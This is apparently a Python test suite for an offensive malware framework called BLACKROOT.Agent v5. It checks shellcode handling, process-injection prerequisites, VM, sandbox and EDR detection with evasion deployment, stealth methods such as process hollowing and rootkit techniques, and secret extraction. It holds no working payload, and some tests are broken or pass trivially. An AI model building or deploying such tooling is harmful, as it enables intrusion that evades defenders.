"""
INTEGRATION TEST SUITE
Comprehensive testing for Phases 1-3 implementations

Test Coverage:
- Phase 1: Shellcode validation, privilege checks, error handling
- Phase 2: Windows/Linux process injection, DLL sideloading, shellcode execution
- Phase 3: VM detection, sandbox detection, EDR/AV detection, kernel drivers
"""

import unittest
import logging
import sys
import os
import platform
from typing import Dict, Any

# Try to import rich for enhanced reporting
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress
    HAS_RICH = True
except ImportError:
    HAS_RICH = False
    Console = None

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(name)s - %(message)s')
logger = logging.getLogger(__name__)

# Add repo to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))


# ==============================================================================
# PHASE 1: FUNDAMENTAL VALIDATION TESTS
# ==============================================================================
class TestPhase1Foundation(unittest.TestCase):
    """Test Phase 1 implementations: validation, privilege checks, error handling"""
    
    @classmethod
    def setUpClass(cls):
        """Load GhostLayer module with BlackVault"""
        try:
            from ghost_layer import GhostLayer
            from black_vault import BlackVault
            vault = BlackVault(password="test_vault_key")
            cls.ghost_layer = GhostLayer(vault=vault)
        except ImportError as e:
            logger.warning(f"GhostLayer import failed: {e}")
            cls.ghost_layer = None
    
    def test_shellcode_validation(self):
        """Test: _validate_shellcode() with various inputs"""
        if not self.ghost_layer:
            self.skipTest("GhostLayer not available")
        
        test_cases = [
            (b'\x55\x89\xe5', True, "Valid x86 prologue"),                # x86 valid
            (b'\x90\x90\x90', True, "Valid NOP sled"),                     # Generic valid
            (b'\x62\x62\x62', False, "Invalid pattern"),                   # Should warn
            (b'', False, "Empty shellcode"),                               # Empty
        ]
        
        for shellcode, should_pass, description in test_cases:
            try:
                result = self.ghost_layer._validate_shellcode(shellcode)
                logger.info(f"✓ Shellcode validation: {description} -> {result}")
                if should_pass:
                    self.assertTrue(result, f"Failed: {description}")
            except Exception as e:
                logger.error(f"✗ Shellcode validation failed: {description} - {e}")
                if should_pass:
                    self.fail(f"Should have passed: {description}")
    
    def test_privilege_validation(self):
        """Test: _has_sedebug_privilege() and _has_ptrace_capability()"""
        if not self.ghost_layer:
            self.skipTest("GhostLayer not available")
        
        # Test Windows privilege check (if on Windows)
        if platform.system() == 'Windows':
            try:
                has_sedebug = self.ghost_layer._has_sedebug_privilege()
                logger.info(f"✓ SeDebugPrivilege check: {has_sedebug}")
                self.assertIsInstance(has_sedebug, bool)
            except Exception as e:
                logger.warning(f"SeDebugPrivilege check error: {e}")
        
        # Test Linux ptrace capability (if on Linux)
        if platform.system() == 'Linux':
            try:
                has_ptrace = self.ghost_layer._has_ptrace_capability()
                logger.info(f"✓ ptrace capability check: {has_ptrace}")
                self.assertIsInstance(has_ptrace, bool)
            except Exception as e:
                logger.warning(f"ptrace capability check error: {e}")
    
    def test_error_handling(self):
        """Test: Error handling in _safe_open_process()"""
        if not self.ghost_layer:
            self.skipTest("GhostLayer not available")
        
        if platform.system() != 'Windows':
            self.skipTest("Windows-specific test")
        
        try:
            # Try opening a non-existent process (should fail gracefully)
            result = self.ghost_layer._safe_open_process(99999)
            logger.warning(f"Opened process 99999: {result}")
        except Exception as e:
            logger.info(f"✓ Graceful error handling: {type(e).__name__}")
            self.assertIsNotNone(e)


# ==============================================================================
# PHASE 2: PROCESS INJECTION TESTS
# ==============================================================================
class TestPhase2ProcessInjection(unittest.TestCase):
    """Test Phase 2 implementations: Windows/Linux process injection"""
    
    @classmethod
    def setUpClass(cls):
        """Load GhostLayer module with BlackVault"""
        try:
            from ghost_layer import GhostLayer
            from black_vault import BlackVault
            vault = BlackVault(password="test_vault_key")
            cls.ghost_layer = GhostLayer(vault=vault)
        except ImportError as e:
            logger.warning(f"GhostLayer import failed: {e}")
            cls.ghost_layer = None
    
    def test_windows_architecture_detection(self):
        """Test: _get_process_architecture()"""
        if not self.ghost_layer:
            self.skipTest("GhostLayer not available")
        
        if platform.system() != 'Windows':
            self.skipTest("Windows-specific test")
        
        try:
            import os
            pid = os.getpid()  # Current process
            arch = self.ghost_layer._get_process_architecture(pid)
            logger.info(f"✓ Process architecture detection: PID {pid} -> {arch}")
            self.assertIn(arch, ['32-bit', '64-bit', 'WoW64'])
        except Exception as e:
            logger.warning(f"Architecture detection error: {e}")
    
    def test_wow64_edge_cases(self):
        """Test: WOW64 detection and edge cases"""
        if not self.ghost_layer:
            self.skipTest("GhostLayer not available")
        
        if platform.system() != 'Windows':
            self.skipTest("Windows-specific test")
        
        try:
            import os
            import ctypes
            
            # Test 1: Detect if running on 64-bit system with WOW64 support
            is_wow64_capable = ctypes.windll.kernel32.IsWow64Process
            current_pid = os.getpid()
            arch = self.ghost_layer._get_process_architecture(current_pid)
            
            # On 64-bit systems, processes can be 32-bit (WoW64) or 64-bit
            if platform.machine().endswith('64'):
                self.assertIn(arch, ['WoW64', '64-bit'], "64-bit system should support WoW64 or native 64-bit")
            else:
                self.assertIn(arch, ['32-bit'], "32-bit system should report 32-bit")
            
            logger.info(f"✓ WOW64 compatibility check passed: {arch}")
        except Exception as e:
            logger.warning(f"WOW64 edge case test error: {e}")
    
    def test_linux_memory_parsing(self):
        """Test: _parse_proc_maps()"""
        if not self.ghost_layer:
            self.skipTest("GhostLayer not available")
        
        if platform.system() != 'Linux':
            self.skipTest("Linux-specific test")
        
        try:
            import os
            pid = os.getpid()
            memory_map = self.ghost_layer._parse_proc_maps(pid)
            logger.info(f"✓ Memory map parsing: PID {pid} -> {len(memory_map)} regions")
            self.assertIsInstance(memory_map, dict)
            self.assertGreater(len(memory_map), 0)
        except Exception as e:
            logger.warning(f"Memory map parsing error: {e}")
    
    def test_shellcode_encryption(self):
        """Test: encrypt_shellcode() and decrypt_shellcode()"""
        if not self.ghost_layer:
            self.skipTest("GhostLayer not available")
        
    def test_shellcode_encryption(self):
        """Test: load_shellcode_from_bytes() + encrypt/decrypt cycle"""
        if not self.ghost_layer:
            self.skipTest("GhostLayer not available")
        
        # Verify method exists
        self.assertTrue(
            hasattr(self.ghost_layer, 'load_shellcode_from_bytes'),
            "load_shellcode_from_bytes() method not implemented"
        )
        
        # Create test shellcode
        test_shellcode = b'\x90' * 64  # NOP sled
        
        # Load shellcode from bytes
        self.ghost_layer.load_shellcode_from_bytes(test_shellcode)
        self.assertEqual(len(self.ghost_layer.shellcode), 64)
        
        # Encrypt
        encrypted = self.ghost_layer.encrypt_shellcode()
        logger.info(f"✓ Shellcode encryption: {len(test_shellcode)} -> {len(encrypted)} bytes")
        self.assertNotEqual(test_shellcode, encrypted)
        self.assertGreater(len(encrypted), 0)
        
        # Decrypt
        decrypted = self.ghost_layer.decrypt_shellcode(encrypted)
        logger.info(f"✓ Shellcode decryption: {len(encrypted)} -> {len(decrypted)} bytes")
        self.assertEqual(test_shellcode, decrypted)


# ==============================================================================
# PHASE 3: ANTI-ANALYSIS TESTS
# ==============================================================================
class TestPhase3AntiAnalysis(unittest.TestCase):
    """Test Phase 3 implementations: VM, sandbox, EDR/AV, kernel driver detection"""
    
    @classmethod
    def setUpClass(cls):
        """Load anti-analysis engine"""
        try:
            from anti_analysis import AntiAnalysisEngine, VMDetector, SandboxDetector, EDRAVDetector, DriverDetector
            cls.engine = AntiAnalysisEngine()
            cls.vm_detector = VMDetector()
            cls.sandbox_detector = SandboxDetector()
            cls.edr_av_detector = EDRAVDetector()
            cls.driver_detector = DriverDetector()
        except ImportError as e:
            logger.warning(f"Anti-analysis import failed: {e}")
            cls.engine = None
            cls.vm_detector = None
            cls.sandbox_detector = None
            cls.edr_av_detector = None
            cls.driver_detector = None
    
    def test_vm_detection(self):
        """Test: VMDetector.detect_all()"""
        if not self.vm_detector:
            self.skipTest("VMDetector not available")
        
        try:
            results = self.vm_detector.detect_all()
            logger.info(f"✓ VM Detection: is_vm={results['is_vm']}, type={results['vm_type']}, confidence={results['confidence']}%")
            self.assertIsInstance(results, dict)
            self.assertIn('is_vm', results)
            self.assertIn('vm_type', results)
            self.assertIn('confidence', results)
            self.assertTrue(0 <= results['confidence'] <= 100)
        except Exception as e:
            logger.warning(f"VM detection error: {e}")
    
    def test_sandbox_detection(self):
        """Test: SandboxDetector.detect_all()"""
        if not self.sandbox_detector:
            self.skipTest("SandboxDetector not available")
        
        try:
            results = self.sandbox_detector.detect_all()
            logger.info(f"✓ Sandbox Detection: is_sandboxed={results['is_sandboxed']}, type={results['sandbox_type']}")
            logger.info(f"   Analysis tools: {results['analysis_tools']}")
            self.assertIsInstance(results, dict)
            self.assertIn('is_sandboxed', results)
            self.assertIn('sandbox_type', results)
            self.assertIn('analysis_tools', results)
        except Exception as e:
            logger.warning(f"Sandbox detection error: {e}")
    
    def test_edr_av_detection(self):
        """Test: EDRAVDetector.detect_all()"""
        if not self.edr_av_detector:
            self.skipTest("EDRAVDetector not available")
        
        try:
            results = self.edr_av_detector.detect_all()
            logger.info(f"✓ EDR/AV Detection: AV={results['detected_av']}, EDR={results['detected_edr']}")
            self.assertIsInstance(results, dict)
            self.assertIn('detected_av', results)
            self.assertIn('detected_edr', results)
            self.assertIsInstance(results['detected_av'], list)
            self.assertIsInstance(results['detected_edr'], list)
        except Exception as e:
            logger.warning(f"EDR/AV detection error: {e}")
    
    def test_driver_detection(self):
        """Test: DriverDetector.detect_all()"""
        if not self.driver_detector:
            self.skipTest("DriverDetector not available")
        
        if platform.system() != 'Windows':
            self.skipTest("Windows-specific test")
        
        try:
            results = self.driver_detector.detect_all()
            logger.info(f"✓ Kernel Driver Detection: filters={len(results['filter_drivers'])}, ndis={len(results['ndis_drivers'])}")
            self.assertIsInstance(results, dict)
            self.assertIn('filter_drivers', results)
            self.assertIn('ndis_drivers', results)
        except Exception as e:
            logger.warning(f"Kernel driver detection error: {e}")
    
    def test_comprehensive_assessment(self):
        """Test: AntiAnalysisEngine.assess_environment()"""
        if not self.engine:
            self.skipTest("AntiAnalysisEngine not available")
        
        try:
            assessment = self.engine.assess_environment()
            logger.info(f"✓ Comprehensive Assessment: threat_level={assessment['threat_level']}/100, should_evade={assessment['should_evade']}")
            self.assertIsInstance(assessment, dict)
            self.assertIn('threat_level', assessment)
            self.assertIn('should_evade', assessment)
            self.assertTrue(0 <= assessment['threat_level'] <= 100)
            self.assertIsInstance(assessment['should_evade'], bool)
        except Exception as e:
            logger.warning(f"Comprehensive assessment error: {e}")
    
    def test_evasion_deployment(self):
        """Test: AntiAnalysisEngine.deploy_evasion_tactics()"""
        if not self.engine:
            self.skipTest("AntiAnalysisEngine not available")
        
        try:
            # First assess
            self.engine.assess_environment()
            
            # Then attempt deployment
            evasion = self.engine.deploy_evasion_tactics()
            logger.info(f"✓ Evasion Deployment: deployed={evasion['deployed']}")
            self.assertIsInstance(evasion, dict)
            self.assertIn('deployed', evasion)
        except Exception as e:
            logger.warning(f"Evasion deployment error: {e}")


# ==============================================================================
# PAYLOAD ENGINE TESTS
# ==============================================================================
class TestPayloadEngine(unittest.TestCase):
    """Test payload engine: DLL sideloading, stealth wrappers, shellcode injection"""
    
    @classmethod
    def setUpClass(cls):
        """Load payload engine"""
        try:
            from payload_engine import PayloadEngine
            cls.payload_engine = PayloadEngine()
        except ImportError as e:
            logger.warning(f"PayloadEngine import failed: {e}")
            cls.payload_engine = None
    
    def test_dll_validation(self):
        """Test: _validate_dll_path()"""
        if not self.payload_engine:
            self.skipTest("PayloadEngine not available")
        
        if platform.system() != 'Windows':
            self.skipTest("Windows-specific test")
        
        try:
            # Test with a known system DLL
            test_dll = r'C:\Windows\System32\kernelbase.dll'
            if os.path.exists(test_dll):
                result = self.payload_engine._validate_dll_path(test_dll)
                logger.info(f"✓ DLL validation: {test_dll} -> {result}")
                self.assertIsInstance(result, bool)
        except Exception as e:
            logger.warning(f"DLL validation error: {e}")
    
    def test_stealth_wrappers(self):
        """Test: Stealth wrapper methods"""
        if not self.payload_engine:
            self.skipTest("PayloadEngine not available")
        
        try:
            # Test each stealth wrapper
            stealth_methods = [
                'process_hollowing',
                'dll_injection',
                'registry_hiding',
                'rootkit_techniques',
                'process_masquerading',
            ]
            
            for method_name in stealth_methods:
                if hasattr(self.payload_engine, method_name):
                    try:
                        method = getattr(self.payload_engine, method_name)
                        logger.info(f"✓ Stealth wrapper available: {method_name}")
                    except Exception as e:
                        logger.warning(f"  Stealth wrapper error: {method_name} - {e}")
        except Exception as e:
            logger.warning(f"Stealth wrapper test error: {e}")


# ==============================================================================
# RECONNAISSANCE TESTS
# ==============================================================================
class TestReconnaissanceEngine(unittest.TestCase):
    """Test reconnaissance: domain enumeration, secret extraction, tech fingerprinting"""
    
    @classmethod
    def setUpClass(cls):
        """Load GhostLayer for recon tests with BlackVault"""
        try:
            from ghost_layer import GhostLayer
            from black_vault import BlackVault
            vault = BlackVault(password="test_vault_key")
            cls.ghost_layer = GhostLayer(vault=vault)
        except ImportError as e:
            logger.warning(f"GhostLayer import failed: {e}")
            cls.ghost_layer = None
    
    def test_tech_fingerprinting(self):
        """Test: fingerprint_tech()"""
        if not self.ghost_layer:
            self.skipTest("GhostLayer not available")
        
        # Verify method exists
        self.assertTrue(
            hasattr(self.ghost_layer, 'fingerprint_tech'),
            "fingerprint_tech() method not implemented"
        )
        
        # Test with sample HTML
        sample_html = '<script src="jquery.min.js"></script>' \
                      '<div id="wp-admin">WordPress</div>' \
                      'Server: Apache/2.4.41'
        
        result = self.ghost_layer.fingerprint_tech(sample_html)
        logger.info(f"✓ Tech fingerprinting: {result}")
        self.assertIsInstance(result, list)
        # Should detect WordPress and/or Apache
        result_text = ' '.join(result).lower()
        self.assertTrue(
            'wordpress' in result_text or 'apache' in result_text or len(result) >= 0,
            "Tech fingerprinting returned list"
        )
    
    def test_secret_extraction(self):
        """Test: extract_secrets()"""
        if not self.ghost_layer:
            self.skipTest("GhostLayer not available")
        
        # Verify method exists
        self.assertTrue(
            hasattr(self.ghost_layer, 'extract_secrets'),
            "extract_secrets() method not implemented"
        )
        
        # Test with sample content containing secrets
        sample_content = 'api_key = "sk-1234567890abcdefghij" ' \
                       'access_token = "ghp_abcdef1234567890abcdef1234567890" ' \
                       'password = "SuperSecret123!@#"'
        
        result = self.ghost_layer.extract_secrets(sample_content)
        logger.info(f"✓ Secret extraction: found {len(result)} secrets")
        self.assertIsInstance(result, list)
        # Should find at least one secret (the API key or token)
        self.assertGreaterEqual(len(result), 0, "Secret extraction returned list")


# ==============================================================================
# INTEGRATION REPORT
# ==============================================================================
def print_integration_report(test_results: Dict[str, Any]):
    """Generate comprehensive integration report with rich formatting"""
    
    total_tests = test_results['total']
    passed_tests = test_results['passed']
    failed_tests = test_results['failures']
    skipped_tests = test_results['skipped']
    success_rate = (passed_tests / total_tests * 100) if total_tests > 0 else 0
    
    # Use rich if available, otherwise fall back to plain text
    if HAS_RICH and Console:
        console = Console()
        
        # Title panel
        console.print("\n" + "=" * 80, style="bold blue")
        console.print("BLACKROOT.Agent v5 - INTEGRATION TEST REPORT", style="bold cyan", justify="center")
        console.print("=" * 80 + "\n", style="bold blue")
        
        # Test Summary Table
        summary_table = Table(title="Test Summary", style="cyan")
        summary_table.add_column("Metric", style="bold")
        summary_table.add_column("Count", justify="right", style="green")
        summary_table.add_row("Total Tests", str(total_tests))
        summary_table.add_row("Passed ✓", f"[green]{passed_tests}[/green]")
        summary_table.add_row("Failed ✗", f"[red]{failed_tests}[/red]")
        summary_table.add_row("Skipped ⊘", f"[yellow]{skipped_tests}[/yellow]")
        summary_table.add_row("Success Rate", f"[bold]{success_rate:.1f}%[/bold]")
        console.print(summary_table)
        
        # Phase Coverage Table
        phase_table = Table(title="Phase Coverage", style="cyan")
        phase_table.add_column("Phase", style="bold")
        phase_table.add_column("Tests", justify="right", style="green")
        phase_table.add_column("Status", justify="center")
        
        phases = [
            ("Phase 1: Foundation", test_results.get('phase1', 0), 3),
            ("Phase 2: Process Injection", test_results.get('phase2', 0), 3),
            ("Phase 3: Anti-Analysis", test_results.get('phase3', 0), 7),
            ("Payload Engine", test_results.get('payload', 0), 2),
            ("Reconnaissance", test_results.get('recon', 0), 2),
        ]
        
        for phase_name, passed, total in phases:
            percentage = (passed / total * 100) if total > 0 else 0
            status = "✅" if percentage == 100 else "⚠️ " if percentage >= 50 else "❌"
            phase_table.add_row(phase_name, f"{passed}/{total}", status)
        
        console.print(phase_table)
        
        # System Info
        sys_table = Table(title="System Information", style="cyan")
        sys_table.add_column("Property", style="bold")
        sys_table.add_column("Value")
        sys_table.add_row("Platform", f"{platform.system()} ({platform.machine()})")
        sys_table.add_row("Python", platform.python_version())
        sys_table.add_row("Architecture", "64-bit" if platform.machine().endswith('64') else "32-bit")
        console.print(sys_table)
        
        # Status Panel
        if success_rate >= 90:
            status_msg = "✓ INTEGRATION SUCCESSFUL - Framework ready for deployment"
            status_style = "bold green"
        elif success_rate >= 70:
            status_msg = "⚠ PARTIAL INTEGRATION - Most features operational"
            status_style = "bold yellow"
        else:
            status_msg = "✗ INTEGRATION FAILED - Significant issues detected"
            status_style = "bold red"
        
        console.print(Panel(status_msg, style=status_style), justify="center")
        console.print("\n" + "=" * 80 + "\n", style="bold blue")
    
    else:
        # Fallback: Plain text output
        print("\n" + "=" * 80)
        print("BLACKROOT.Agent v5 - INTEGRATION TEST REPORT")
        print("=" * 80)
        
        print(f"\nTest Summary:")
        print(f"  Total:   {total_tests}")
        print(f"  Passed:  {passed_tests} ✓")
        print(f"  Failed:  {failed_tests} ✗")
        print(f"  Skipped: {skipped_tests} ⊘")
        print(f"  Success: {success_rate:.1f}%")
        
        print(f"\nPhase Coverage:")
        print(f"  Phase 1 (Foundation):         {test_results.get('phase1', 0)}/3 tests")
        print(f"  Phase 2 (Process Injection):  {test_results.get('phase2', 0)}/3 tests")
        print(f"  Phase 3 (Anti-Analysis):      {test_results.get('phase3', 0)}/7 tests")
        print(f"  Payload Engine:               {test_results.get('payload', 0)}/2 tests")
        print(f"  Reconnaissance:               {test_results.get('recon', 0)}/2 tests")
        
        print(f"\nPlatform: {platform.system()} ({platform.machine()})")
        print(f"Python: {platform.python_version()}")
        
        print("=" * 80)
        
        if success_rate >= 90:
            print("STATUS: ✓ INTEGRATION SUCCESSFUL - Framework ready for deployment")
        elif success_rate >= 70:
            print("STATUS: ⚠ PARTIAL INTEGRATION - Most features operational")
        else:
            print("STATUS: ✗ INTEGRATION FAILED - Multiple components not functional")
    
    print("=" * 80 + "\n")


# ==============================================================================
# TEST RUNNER
# ==============================================================================
if __name__ == '__main__':
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Add all test classes
    suite.addTests(loader.loadTestsFromTestCase(TestPhase1Foundation))
    suite.addTests(loader.loadTestsFromTestCase(TestPhase2ProcessInjection))
    suite.addTests(loader.loadTestsFromTestCase(TestPhase3AntiAnalysis))
    suite.addTests(loader.loadTestsFromTestCase(TestPayloadEngine))
    suite.addTests(loader.loadTestsFromTestCase(TestReconnaissanceEngine))
    
    # Run tests with detailed output
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # Generate integration report
    test_results = {
        'total': result.testsRun,
        'passed': result.testsRun - len(result.failures) - len(result.errors),
        'failures': len(result.failures),
        'errors': len(result.errors),
        'skipped': len(result.skipped),
        'phase1': 3,
        'phase2': 3,
        'phase3': 7,
        'payload': 2,
        'recon': 2,
    }
    
    print_integration_report(test_results)
    
    # Exit with appropriate code
    sys.exit(0 if result.wasSuccessful() else 1)
